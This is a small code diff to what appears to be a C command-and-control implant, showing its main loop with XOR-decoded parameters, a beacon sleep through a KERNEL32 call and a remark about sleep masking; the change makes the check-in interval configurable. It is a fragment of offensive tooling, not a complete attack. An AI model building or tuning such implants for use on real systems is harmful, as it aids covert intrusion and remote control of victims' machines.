@@ -292,6 +292,7 @@ void process_task(TaskInfo *task, AgentState *state) {
 
 void go() {
 	AgentState state = { 0 };
+	state.sleep_time = DEFAULT_SLEEP_TIME;
 	
 	unpack_params(ENC_PARAMS, XORKEY, &state.params);
 	
@@ -348,7 +349,7 @@ void go() {
 	
 	while (1) {
 		// Look ma, no masking!
-		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
+		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), state.sleep_time * 1000);
 		
 		TaskingReply tasking_reply = { 0 };
 		BOOL task_result = perform_tasking(&state, &tasking_reply);
